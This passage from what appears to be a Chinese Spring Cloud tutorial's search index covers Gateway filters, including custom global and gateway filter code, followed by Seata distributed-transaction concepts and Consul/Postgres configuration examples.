MapRequestHeader\uff0c\u6620\u5c04\u8bf7\u6c42\u5934 RequestHeaderSize\uff0c\u9650\u5236\u8bf7\u6c42\u5934\u7684\u5927\u5c0f \u54cd\u5e94\u5934\u76f8\u5173 AddResponseHeader\uff0c\u6dfb\u52a0\u54cd\u5e94\u5934 SetResponseHeader\uff0c\u8bbe\u7f6e\u54cd\u5e94\u5934 FallbackHeaders\uff0c\u670d\u52a1\u964d\u7ea7\u65f6\u8bbe\u7f6e\u54cd\u5e94\u5934 RemoveResponseHeader\uff0c\u79fb\u9664\u54cd\u5e94\u5934 DedupeResponseHeader\uff0c\u5220\u9664\u54cd\u5e94\u5934\u4e2d\u7684\u91cd\u590d\u6761\u76ee RewriteLocationResponseHeader\uff0c\u91cd\u5199 Location \u54cd\u5e94\u5934\u4e2d\u7684 URL RewriteResponseHeader\uff0c\u91cd\u5199\u54cd\u5e94\u5934\u4e2d\u7684\u7279\u5b9a\u503c SecureHeaders\uff0c\u6dfb\u52a0\u5e38\u89c1\u7684\u5b89\u5168\u76f8\u5173 HTTP \u5934 RewriteLocationResponseHeader\uff0c\u91cd\u5199 Location \u54cd\u5e94\u5934\u4e2d\u7684 URL \u8def\u5f84\u548c\u53c2\u6570\u76f8\u5173 RewritePath\uff0c\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u548c\u91cd\u5199\u8bf7\u6c42\u8def\u5f84 SetPath\uff0c\u8bbe\u7f6e\u8bf7\u6c42\u8def\u5f84 StripPrefix\uff0c\u53bb\u9664\u8bf7\u6c42\u8def\u5f84\u4e2d\u7684\u6307\u5b9a\u524d\u7f00 PrefixPath\uff0c\u5728\u8bf7\u6c42\u8def\u5f84\u524d\u6dfb\u52a0\u6307\u5b9a\u7684\u524d\u7f00 AddRequestParameter\uff0c\u6dfb\u52a0\u8bf7\u6c42\u53c2\u6570 RemoveRequestParameter\uff0c\u79fb\u9664\u8bf7\u6c42\u53c2\u6570 RewriteRequestParameter\uff0c\u91cd\u5199\u8bf7\u6c42\u53c2\u6570\u7684\u503c \u8bf7\u6c42\u4f53\u548c\u54cd\u5e94\u4f53\u76f8\u5173 ModifyRequestBody\uff0c\u4fee\u6539\u8bf7\u6c42\u4f53\u7684\u5185\u5bb9 CacheRequestBody\uff0c\u7f13\u5b58\u8bf7\u6c42\u4f53 ModifyResponseBody\uff0c\u4fee\u6539\u54cd\u5e94\u4f53\u7684\u5185\u5bb9 RemoveJsonAttributesResponseBody\uff0c\u4ece JSON \u54cd\u5e94\u4f53\u4e2d\u79fb\u9664\u6307\u5b9a\u7684\u5c5e\u6027 JsonToGrpc\uff0c\u5c06 JSON \u683c\u5f0f\u7684\u8bf7\u6c42\u4f53\u8f6c\u6362\u4e3a gRPC \u683c\u5f0f \u6d41\u91cf\u7ba1\u7406\u548c\u5bb9\u9519\u76f8\u5173 CircuitBreaker\uff0c\u5b9e\u73b0\u65ad\u8def\u5668\u529f\u80fd Retry\uff0c\u5728\u8bf7\u6c42\u5931\u8d25\u65f6\u6309\u7167\u6307\u5b9a\u7684\u7b56\u7565\u91cd\u8bd5\u8bf7\u6c42 RequestRateLimiter\uff0c\u5bf9\u8bf7\u6c42\u8fdb\u884c\u901f\u7387\u9650\u5236 RequestSize\uff0c\u9650\u5236\u8bf7\u6c42\u7684\u5927\u5c0f LocalResponseCache\uff0c\u5728\u672c\u5730\u7f13\u5b58\u54cd\u5e94 \u91cd\u5b9a\u5411\u548c\u72b6\u6001\u7801\u76f8\u5173 RedirectTo\uff0c\u5c06\u8bf7\u6c42\u91cd\u5b9a\u5411\u5230\u6307\u5b9a\u7684 URI SetStatus\uff0c\u8bbe\u7f6e\u54cd\u5e94\u72b6\u6001\u7801 \u8ba4\u8bc1\u548c\u4f1a\u8bdd\u7ba1\u7406\u76f8\u5173 TokenRelay\uff0c\u5c06 OAuth 2.0 \u4ee4\u724c\u4ece\u7f51\u5173\u4f20\u9012\u5230\u4e0b\u6e38\u670d\u52a1 SaveSession\uff0c\u4fdd\u5b58\u4f1a\u8bdd\u4fe1\u606f PreserveHostHeader\uff0c\u4fdd\u7559\u539f\u59cb\u8bf7\u6c42\u4e2d\u7684 Host \u5934 \u8981\u6dfb\u52a0 Filter\uff0c\u540c\u6837\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 Bean\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u6dfb\u52a0\u8bf7\u6c42\u5934\u7684 Filter\u3002\u4e0e\u4e4b\u524d Predicate \u91cc\u52a0\u5165\u4e00\u4e2a\u5217\u8868\u4e0d\u540c\uff0cFilter \u9700\u8981\u4f20\u5165\u4e00\u4e2a Map\uff0ckey \u548c value \u4ea4\u66ff\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Path=/** filters: - AddRequestHeader=X-Request-Foo, Bar \u5f53\u7136\uff0c\u53ef\u4ee5\u7528\u5168\u5c55\u5f00\u7684\u65b9\u5f0f\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - name: Path args: pattern: /** filters: - name: AddRequestHeader args: headerName: X-Request-Foo headerValue: Bar \u540c\u6837\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 Bean \u6765\u914d\u7f6e\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002","title":"Filter"},{"location":"10/#filter_1","text":"\u81ea\u5b9a\u4e49 GlobalFilter \u9700\u8981\u5b9e\u73b0 GlobalFilter \u548c Ordered \u63a5\u53e3\uff0c\u524d\u8005\u662f Filter \u7684\u63a5\u53e3\uff0c\u540e\u8005\u5b9a\u4e49\u4e86\u4e00\u4e2a getOrder \u65b9\u6cd5\uff0c\u7528\u4e8e\u5b9a\u4e49 Filter \u7684\u987a\u5e8f\uff0c\u8fd9\u4e2a getOrder \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u503c\u8d8a\u5c0f\uff0cFilter \u7684\u4f18\u5148\u7ea7\u8d8a\u9ad8\u3002 @Component public class CustomFilter implements GlobalFilter, Ordered { @Override public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) { // do something return chain.filter(exchange); } @Override public int getOrder() { return 0; } } \u8fd9\u91cc\u7684 Mono \u662f WebFlux \u7684\u8bed\u6cd5\uff0c\u6211\u4eec\u53ea\u4f1a\u5728\u4e0b\u9762\u7528\u5230\u4e00\u70b9\u70b9\uff0c\u4e0d\u7528\u592a\u62c5\u5fc3\u3002\u5982\u679c\u4f60\u5b66\u8fc7 JavaScript \u7684 Promise\uff0c\u90a3\u4e48 Mono \u5c31\u662f\u7c7b\u4f3c\u7684\u4e1c\u897f\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u7edf\u8ba1\u8bf7\u6c42\u65f6\u95f4\u7684 Filter\uff0c\u53ef\u4ee5\u8fd9\u6837\u5199\uff1a @Component @Slf4j public class RequestTimeFilter implements GlobalFilter, Ordered { @Override public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) { exchange.getAttributes().put(\"requestTimeBegin\", System.currentTimeMillis()); return chain.filter(exchange).then( Mono.fromRunnable(() -> { Long startTime = exchange.getAttribute(\"requestTimeBegin\"); if (startTime != null) { log.info(exchange.getRequest().getURI().getRawPath() + \": \" + (System.currentTimeMillis() - startTime) + \"ms\"); } }) ); } @Override public int getOrder() { return 0; } }","title":"\u81ea\u5b9a\u4e49\u5168\u5c40 Filter"},{"location":"10/#gateway-filter","text":"Gateway Filter \u7684\u81ea\u5b9a\u4e49\u4e0e Predicate \u7c7b\u4f3c\uff0c\u9700\u8981\u7ee7\u627f AbstractGatewayFilterFactory \u7c7b\u3002 @Component public class CustomGatewayFilterFactory extends AbstractGatewayFilterFactory<CustomGatewayFilterFactory.Config> { @Validated public class Config { // configurations needed for this filter @Data String secret; } @Override public List<String> shortcutFieldOrder() { // return the order of the arguments return Arrays.asList(\"secret\"); } public CustomGatewayFilterFactory() { super(Config.class); } @Override public GatewayFilter apply(Config config) { return new GatewayFilter() { @Override public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) { String secret = exchange.getRequest().getQueryParams().getFirst(\"secret\"); if (secret == null || !secret.equals(config.secret)) { exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED); return exchange.getResponse().setComplete(); } return chain.filter(exchange); } }; } } \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u5bc6\u7801\u9a8c\u8bc1 Filter\u3002\u6dfb\u52a0\u4e4b\u540e\uff0c\u5728 yml \u6587\u4ef6\u4e2d\u4f7f\u7528\u65f6\uff0cFull Expanded \u7684\u65b9\u5f0f\u5982\u4e0b\uff1a spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - name: Path args: pattern: /** filters: - name: Custom args: secret: 123 \u800c Shortcut \u7684\u65b9\u5f0f\u5982\u4e0b\uff0c\u5176\u4e2d\u53c2\u6570\u7528\u9017\u53f7\u5206\u9694\uff0c\u987a\u5e8f\u4e0e\u4e0a\u9762\u7684 ShortcutFieldOrder \u8fd4\u56de\u503c\u4e00\u81f4\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Path=/** filters: - Custom=123 \u4e00\u6837\u7684\uff0cCustom \u662f\u7c7b\u540d\u7684\u53bb\u6389 GatewayFilterFactory \u540e\u7684\u90e8\u5206\u3002","title":"\u81ea\u5b9a\u4e49 Gateway Filter"},{"location":"11/","text":"Spring Cloud \u901f\u6210 Ch11 \u5206\u5e03\u5f0f\u4e8b\u52a1 Seata Seata \u5c5e\u4e8e Spring Cloud Alibaba \u7684\u7ec4\u4ef6\uff0c\u8fd9\u91cc\u6211\u4eec\u4ecb\u7ecd\u5b83\u7684\u539f\u56e0\u662f Spring Cloud \u5b98\u65b9\u5e76\u6ca1\u6709\u63d0\u4f9b\u5206\u5e03\u5f0f\u4e8b\u52a1\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u800c Seata \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u4e8b\u52a1\u89e3\u51b3\u65b9\u6848\uff0c\u5b83\u63d0\u4f9b\u4e86 AT\u3001TCC\u3001SAGA\u3001XA \u56db\u79cd\u5206\u5e03\u5f0f\u4e8b\u52a1\u89e3\u51b3\u65b9\u6848\uff0c\u5176\u4e2d AT \u6a21\u5f0f\u662f\u6700\u5e38\u7528\u7684\u3002\u6211\u4eec\u53ea\u4ecb\u7ecd AT \u6a21\u5f0f\u3002 \u4e8b\u52a1 Spring \u4e2d\uff0c\u4e8b\u52a1\u662f\u6307\u7684\u662f\u4e00\u7ec4\u64cd\u4f5c\uff0c\u8981\u4e48\u5168\u90e8\u6210\u529f\uff0c\u8981\u4e48\u5168\u90e8\u5931\u8d25\u3002\u5728 Spring \u4e2d\u4f7f\u7528\u4e8b\u52a1\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 @Transactional \u6ce8\u89e3\uff0c\u5b83\u53ef\u4ee5\u7528\u5728\u7c7b\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u7528\u5728\u65b9\u6cd5\u4e0a\uff0c\u7528\u5728\u7c7b\u4e0a\u8868\u793a\u7c7b\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u90fd\u662f\u4e8b\u52a1\u6027\u7684\uff0c\u7528\u5728\u65b9\u6cd5\u4e0a\u8868\u793a\u8be5\u65b9\u6cd5\u662f\u4e8b\u52a1\u6027\u7684\u3002 @Service public class UserService { @Autowired private UserDao userDao; @Transactional public void add() { userDao.add(); int i = 1 / 0; } } \u52a0\u4e0a\u8fd9\u4e2a\u6ce8\u89e3\u540e\uff0cSpring \u4f1a\u5728\u65b9\u6cd5\u6267\u884c\u524d\u5f00\u542f\u4e00\u4e2a\u4e8b\u52a1\uff0c\u65b9\u6cd5\u6267\u884c\u540e\uff0c\u5982\u679c\u6ca1\u6709\u5f02\u5e38\uff0c\u4f1a\u63d0\u4ea4\u4e8b\u52a1\uff0c\u5982\u679c\u6709\u5f02\u5e38\uff0c\u4f1a\u56de\u6eda\u4e8b\u52a1\u3002\u8fd9\u91cc\u7684\u56de\u6eda\u662f\u901a\u8fc7 AOP \u5b9e\u73b0\u7684\uff0cSpring \u4f1a\u5728\u65b9\u6cd5\u6267\u884c\u524d\u540e\u63d2\u5165\u4e00\u4e9b\u4ee3\u7801\uff0c\u8fd9\u4e9b\u4ee3\u7801\u5c31\u662f\u4e8b\u52a1\u7684\u5b9e\u73b0\u3002 \u5206\u5e03\u5f0f\u4e8b\u52a1 \u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u4e8b\u52a1\u7684\u95ee\u9898\u4f1a\u66f4\u52a0\u590d\u6742\uff0c\u56e0\u4e3a\u4e8b\u52a1\u4e0d\u518d\u662f\u5728\u4e00\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u800c\u662f\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\u3002\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u4fdd\u8bc1\u4e8b\u52a1\u7684 ACID \u7279\u6027\uff0c \u539f\u5b50\u6027\uff08Atomicity\uff09\uff1a\u4e8b\u52a1\u662f\u4e00\u4e2a\u4e0d\u53ef\u5206\u5272\u7684\u5de5\u4f5c\u5355\u4f4d\uff0c\u8981\u4e48\u5168\u90e8\u6210\u529f\uff0c\u8981\u4e48\u5168\u90e8\u5931\u8d25\u3002\u4f46\u662f\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u4e8b\u52a1\u53ef\u80fd\u4f1a\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u4fdd\u8bc1\u6240\u6709\u6570\u636e\u5e93\u7684\u4e8b\u52a1\u8981\u4e48\u5168\u90e8\u6210\u529f\uff0c\u8981\u4e48\u5168\u90e8\u5931\u8d25\u3002 \u4e00\u81f4\u6027\uff08Consistency\uff09\uff1a\u4e8b\u52a1\u6267\u884c\u524d\u540e\uff0c\u6570\u636e\u7684\u5b8c\u6574\u6027\u6ca1\u6709\u88ab\u7834\u574f\u3002\u4f46\u662f\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u6570\u636e\u53ef\u80fd\u4f1a\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u4fdd\u8bc1\u6240\u6709\u6570\u636e\u5e93\u7684\u6570\u636e\u4e00\u81f4\u3002 \u9694\u79bb\u6027\uff08Isolation\uff09\uff1a\u4e8b\u52a1\u4e4b\u95f4\u662f\u76f8\u4e92\u9694\u79bb\u7684\uff0c\u4e00\u4e2a\u4e8b\u52a1\u7684\u6267\u884c\u4e0d\u4f1a\u5f71\u54cd\u53e6\u4e00\u4e2a\u4e8b\u52a1\u7684\u6267\u884c\u3002\u4f46\u662f\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u4e8b\u52a1\u53ef\u80fd\u4f1a\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u4fdd\u8bc1\u6240\u6709\u6570\u636e\u5e93\u7684\u4e8b\u52a1\u4e4b\u95f4\u662f\u9694\u79bb\u7684\u3002 \u6301\u4e45\u6027\uff08Durability\uff09\uff1a\u4e8b\u52a1\u6267\u884c\u540e\uff0c\u6570\u636e\u662f\u6301\u4e45\u5316\u7684\u3002\u4f46\u662f\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u6570\u636e\u53ef\u80fd\u4f1a\u5728\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u4fdd\u8bc1\u6240\u6709\u6570\u636e\u5e93\u7684\u6570\u636e\u662f\u6301\u4e45\u5316\u7684\u3002 Seata \u4fbf\u662f\u4e00\u4e2a\u89e3\u51b3\u5206\u5e03\u5f0f\u4e8b\u52a1\u7684\u89e3\u51b3\u65b9\u6848\u3002 Seata \u7684\u57fa\u672c\u539f\u7406 Seata \u6709\u4e09\u5927\u6838\u5fc3\u6982\u5ff5\uff1a TC\uff08Transaction Coordinator\uff09\uff1a\u4e8b\u52a1\u534f\u8c03\u5668\uff0c\u8d1f\u8d23\u4e8b\u52a1\u7684\u534f\u8c03\u548c\u5168\u5c40\u4e8b\u52a1\u7684\u7ba1\u7406\u3002\u5373 Seata \u672c\u8eab\u3002 TM\uff08Transaction Manager\uff09\uff1a\u4e8b\u52a1\u7ba1\u7406\u5668\uff0c\u8d1f\u8d23\u4e8b\u52a1\u7684\u5f00\u542f\u3001\u63d0\u4ea4\u3001\u56de\u6eda\u3002\u5373\u4e8b\u52a1\u7684\u53d1\u8d77\u8005\uff0c\u5b83\u8d1f\u8d23\u5b9a\u4e49\u5168\u5c40\u4e8b\u52a1\u7684\u8303\u56f4\uff0c\u5373\u8981\u64cd\u4f5c\u54ea\u4e9b\u6570\u636e\u5e93\u3002\u4e00\u822c\u662f\u7b2c\u4e00\u4e2a\u88ab\u8c03\u7684\uff0c\u5e26\u4e8b\u52a1\u6ce8\u89e3\u7684\u65b9\u6cd5\u3002 RM \uff08Resource Manager\uff09\uff1a\u8d44\u6e90\u7ba1\u7406\u5668\uff0c\u8d1f\u8d23\u7ba1\u7406\u5206\u652f\u4e8b\u52a1\u7684\u6ce8\u518c\u3001\u72b6\u6001\u6c47\u62a5\u3001\u56de\u6eda\u3002\u5373\u6570\u636e\u5e93\u672c\u8eab\u3002 \u6bcf\u4e2a Seata \u4e8b\u52a1\u7684\u751f\u547d\u5468\u671f\u5982\u4e0b\uff1a TM \u5f00\u542f\u4e00\u4e2a\u5168\u5c40\u4e8b\u52a1\uff0c\u751f\u6210\u4e00\u4e2a XID\uff08\u5168\u5c40\u4e8b\u52a1 ID\uff09\u3002 XID \u4f20\u9012\u7ed9 RM\uff0cRM \u751f\u6210\u4e00\u4e2a Branch ID\uff08\u5206\u652f\u4e8b\u52a1 ID\uff09\u3002 RM \u5f00\u542f\u4e00\u4e2a\u5206\u652f\u4e8b\u52a1\uff0c\u6267\u884c\u4e1a\u52a1\u903b\u8f91\u3002 RM \u5c06 Branch ID \u548c XID \u4f20\u9012\u7ed9\u6570\u636e\u5e93\uff0c\u6570\u636e\u5e93\u5c06 Branch ID \u548c XID \u4fdd\u5b58\u5230\u6570\u636e\u5e93\u4e2d\u3002 TM \u6536\u5230 RM \u7684\u8fd4\u56de\uff0c\u5982\u679c\u6240\u6709 RM \u90fd\u8fd4\u56de\u6210\u529f\uff0cTM \u63d0\u4ea4\u4e8b\u52a1\uff0c\u5982\u679c\u6709\u4e00\u4e2a RM \u8fd4\u56de\u5931\u8d25\uff0cTM \u56de\u6eda\u4e8b\u52a1\u3002 \u5bf9\u4e8e AT \u6a21\u5f0f\uff0c\u5177\u4f53\u800c\u8a00\uff0c\u662f\u901a\u8fc7\u9501\u548c\u4e24\u6b21\u63d0\u4ea4\u6765\u5b9e\u73b0\u7684\u3002 \u7b2c\u4e00\u4e2a\u9636\u6bb5\uff0c\u4e1a\u52a1\u6570\u636e\u548c\u56de\u6eda\u65e5\u5fd7\u5728\u540c\u4e00\u4e2a\u672c\u5730\u4e8b\u52a1\u4e2d\u63d0\u4ea4\uff0c\u5728\u63d0\u4ea4\u524d\u540e\uff0c\u4f1a\u8bb0\u5f55\u5feb\u7167\u3002\u7b2c\u4e00\u9636\u6bb5\u7ed3\u675f\u540e\uff0c\u4f1a\u751f\u6210\u884c\u9501\u3002\u7b2c\u4e00\u4e2a\u9636\u6bb5\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u672c\u5730\u4e8b\u52a1\u3002 \u7b2c\u4e8c\u4e2a\u9636\u6bb5\uff0c\u5982\u679c\u6ca1\u6709\u5f02\u5e38\uff0c\u53ea\u8981\u5220\u9664\u7b2c\u4e00\u9636\u6bb5\u7684\u9501\u3001\u65e5\u5fd7\u3001\u5feb\u7167\u5373\u53ef\u3002\u5982\u679c\u6709\u5f02\u5e38\uff0c\u4f1a\u901a\u8fc7\u7b2c\u4e00\u9636\u6bb5\u7684\u65e5\u5fd7\u548c\u5feb\u7167\u8fdb\u884c\u56de\u6eda\u3002 Seata \u7684\u914d\u7f6e \u4e3a\u4e86\u65b9\u4fbf\u90e8\u7f72\uff0c\u8fd9\u91cc\u4f9d\u7136\u4f7f\u7528 Docker\u3002\u4f46\u6ce8\u610f\uff0c\u4e00\u822c\u800c\u8a00\u6570\u636e\u5e93\u4e0d\u4f1a\u653e\u5728 Docker \u91cc\u3002\u5176\u5b83\u90e8\u7f72\u65b9\u5f0f\u89c1 \u6587\u6863 \u3002 \u542f\u52a8\u670d\u52a1 \u9996\u5148\uff0c\u542f\u52a8\u4e00\u4e2a Seata \u670d\u52a1\uff1a seata-server: image: seataio/seata-server:2.0.0 ports: - \"7091:7091\" - \"8091:8091\" depends_on: - postgres - consul volumes: - ./seata/application.yml:/seata-server/resources/application.yml \u4fee\u6539\u914d\u7f6e ./seata/application.yml \u7684\u5177\u4f53\u5185\u5bb9\u8981\u6839\u636e\u4f60\u7684\u914d\u7f6e\u800c\u5b9a\uff0c\u6a21\u7248\u53ef\u4ee5\u5728\u5bb9\u5668\u5185\u7684 /seata-server/resources/application.example.yml \u627e\u5230\uff0c\u6216\u8005\u5728 GitHub \u3002 \u5982\u679c\u7528 consul \u548c postgres\uff0c\u914d\u7f6e\u5982\u4e0b\uff1a seata: config: # support: nacos \u3001 consul \u3001 apollo \u3001 zk \u3001 etcd3 type: consul consul: server-addr: consul:8500 acl-token: key: seata.properties registry: # support: nacos \u3001 eureka \u3001 redis \u3001 zk \u3001 consul \u3001 etcd3 \u3001 sofa type: consul consul: cluster: seata-server server-addr: consul:8500 acl-token: \u5176\u5b83\u7684\u914d\u7f6e\u90fd\u662f\u901a\u8fc7 Consul \u5b8c\u6210\u7684\u3002 \u6ce8\u610f\uff0c\u8fd9\u91cc register \u7684 cluster \u662f Consul \u7684\u670d\u52a1\u540d\uff0c\u4e4b\u540e\u6211\u4eec\u8981\u8981\u5728\u5ba2\u6237\u7aef\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\u8fd9\u4e2a\u670d\u52a1\u540d\u3002 Server \u670d\u52a1\u6ce8\u518c\u4e0e\u914d\u7f6e \u5982\u679c\u4f7f\u7528\u670d\u52a1\u4e2d\u5fc3\u65b9\u5f0f\uff0c\u9700\u8981\u5728\u670d\u52a1\u4e2d\u5fc3\u8fdb\u884c\u914d\u7f6e\u3002\u4e0b\u6587\u4ee5 Consul \u4e3a\u4f8b\u3002 \u8981\u628a Consul \u4f5c\u4e3a seata \u6ce8\u518c\u5730\uff0c\u542f\u52a8 seata \u524d\uff0c\u5c06 \u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6 \u63d0\u4ea4\u7ed9 consul\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528\u5b98\u65b9\u63d0\u4f9b\u7684 \u811a\u672c \uff0c\u8fdb\u5165\u5bb9\u5668\u5185\u4f7f\u7528\u3002\u6ce8\u610f\uff0cconfig.txt \u6587\u4ef6\u8981\u653e\u5728\u8fd9\u4e2a\u811a\u672c\u7684\u4e0a\u7ea7\u76ee\u5f55\u3002\u8fd9\u4e00\u6b65\u662f\u5c06 Consul \u4f5c\u4e3a\u6ce8\u518c\u4e2d\u5fc3\u9700\u8981\u7684\u3002 \u6ce8\u610f\uff0c\u56e0\u4e3a\u6211\u4eec\u7528\u4e86 postgres\uff0c\u8981\u4fee\u6539\u8fd9\u4e00\u90e8\u5206\u914d\u7f6e\u3002 store.db.datasource=druid store.db.dbType=postgresql store.db.driverClassName=org.postgresql.Driver store.db.url=jdbc:postgresql://postgres:5432/seata store.db.user=user store.db.password=password \u8fd9\u4e9b\u53c2\u6570\u7684\u542b\u4e49\u53c2\u8003\u8fd9\u4e2a \u6587\u6863 \u3002 \u800c\u5c06 Consul \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3\uff0c\u8fd8\u8981\u521b\u5efa\u4e00\u4e2a seata.properties \u6587\u4ef6\uff0c\u76ee\u524d\u7559\u7a7a\u5373\u53ef\uff0c\u56e0\u4e3a\u524d\u9762\u7684\u914d\u7f6e\u6587\u4ef6\u5df2\u7ecf\u5305\u542b\u4e86\u6240\u6709\u914d\u7f6e\u3002 Client \u4e8b\u52a1\u5206\u7ec4\u4e0e\u914d\u7f6e \u6211\u4eec\u8bb2\u89e3\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u552f\u4e00\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u4e8b\u52a1\u5206\u7ec4\u3002\u4e8b\u52a1\u5206\u7ec4\u662f\u6307\u5c06\u4e00\u4e2a Seata \u96c6\u7fa4\u4e2d\u4e0d\u540c\u670d\u52a1\u5668\u5206\u6210\u82e5\u5e72\u7ec4\uff0c\u7136\u540e\u4e00\u4e9b\u5fae\u670d\u52a1\u4f1a\u4f7f\u7528\u67d0\u4e2a\u5206\u7ec4\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5728\u4e24\u4e2a\u670d\u52a1\u4e2d\u5f15\u5165 Seata Client \u7684\u4f9d\u8d56\u3002 implementation 'io.seata:seata-spring-boot-starter:2.0.0' implementation 'io.seata:seata-all:2.0.0' \u4f7f\u7528 Spring Boot \u65f6\uff0c\u9ed8\u8ba4\u7684\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff0c seata: registry: type: consul consul: server-addr: 127.0.0.1:8500 # \u4e8b\u52a1\u5206\u7ec4\u914d\u7f6e\uff0c1.4.2 \u9ed8\u8ba4\u540d\u79f0\u4e3a my_test_tx_group \uff0c1.5\u7248\u672c\u5c06\u6539\u4e3a default_tx_group tx-service-group: my_test_tx_group service: # \u4e8b\u52a1\u5206\u7ec4\u4e0e\u96c6\u7fa4\u6620\u5c04\u5173\u7cfb vgroup-mapping: my_test_tx_group: default \u5168\u90e8\u7684\u914d\u7f6e\u53ef\u4ee5\u89c1 \u8fd9\u4e2a\u6587\u4ef6 \u3002 \u5177\u4f53\u800c\u8a00\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5fae\u670d\u52a1\uff0c\u5b83\u5728\u5bfb\u627e\u81ea\u5df1\u5bf9\u5e94\u7684 Seata \u670d\u52a1\u5668\u65f6\uff0c\u4f1a\u7ecf\u8fc7\u5982\u4e0b\u6b65\u9aa4\uff08\u5047\u8bbe\u4f7f\u7528 boot \u7248\u672c\uff09\uff1a Client \u4f1a\u5148\u5728\u914d\u7f6e\u6587\u4ef6\u7684 seata.tx-service-group \u4e2d\u627e\u5230\u4e8b\u52a1\u5206\u7ec4\u7684\u540d\u5b57\u3002\u8fd9\u4e2a\u503c\u9ed8\u8ba4\u662f my_test_tx_group\u3002 Client \u4f1a\u5728 seata.service.vgroupMapping.${seata.tx-service-group} \u4e2d\u627e\u5230\u8fd9\u4e2a\u5206\u7ec4\u5bf9\u5e94\u7684\u670d\u52a1\u540d\u3002\u8fd9\u4e2a\u503c\u8bb0\u4e3a\u5206\u7ec4\u540d group-name \u3002\u5982\u679c\u4f7f\u7528\u8fdc\u7a0b\u914d\u7f6e\uff0c\u8fd9\u4e2a\u503c\u7684 key \u7701\u7565\u4e3a service.vgroup-mapping.${seata.tx-service-group} \u3002 Client \u5728 service.grouplist.${group-name} \u627e\u5230\u8fd9\u4e2a\u5206\u7ec4\u7684\u670d\u52a1\u5668\u5730\u5740\u3002\u4f7f\u7528\u8fdc\u7a0b\u914d\u7f6e\u65f6\uff0c\u4f1a\u7528 ${group-name} \u4f5c\u4e3a\u670d\u52a1\u540d\u53bb\u627e\u3002 \u5982\u679c\u5168\u7528\u672c\u5730\u914d\u7f6e\uff0c\u5e94\u5f53\u8fd9\u6837\uff08type \u5b57\u6bb5\u9ed8\u8ba4\u90fd\u662f file\uff09\uff1a seata: registry: consul: server-addr: localhost:8500 tx-service-group: tx_group service: vgroup-mapping: tx_group: seata-group grouplist: seata-group: 127.0.0.1:8091 \u5bf9\u4e8e\u6211\u4eec\u4f7f\u7528 consul\uff0c\u5e94\u8be5\u8fd9\u6837\u914d\u7f6e\uff1a seata: config: type: consul consul: server-addr: localhost:8500 registry: type: consul consul: server-addr: localhost:8500 tx-service-group: tx_group \u800c service \u90e8\u5206\u5e94\u5f53\u8fdc\u7a0b\u914d\u7f6e\uff0c\u5373\u5728 Consul \u7684 KV \u4e2d\uff0c\u6211\u4eec\u4e4b\u524d\u7684 config \u53ea\u6dfb\u52a0\u4e86\u9ed8\u8ba4\u7684\u914d\u7f6e\uff0c\u73b0\u5728\u8981\u6dfb\u52a0\u8fd9\u4e9b\u5b57\u6bb5\uff1a service.vgroup-mapping.tx_group=seata-server \u8fd9\u91cc seata-server \u662f\u6211\u4eec\u7684\u670d\u52a1\u540d\uff0c\u5373\u4e4b\u524d\u914d\u7f6e\u7684 cluster \u3002 \u4f46\u662f\uff0c\u6ce8\u610f\uff0c\u76ee\u524d\u56e0\u4e3a\u6211\u4eec\u4f7f\u7528\u4e86 docker \u914d\u7f6e\uff0c\u6240\u4ee5\u6211\u8fd9\u91cc\u83b7\u53d6\u7684 seata \u5730\u5740\u662f 172.18.0.5:8091 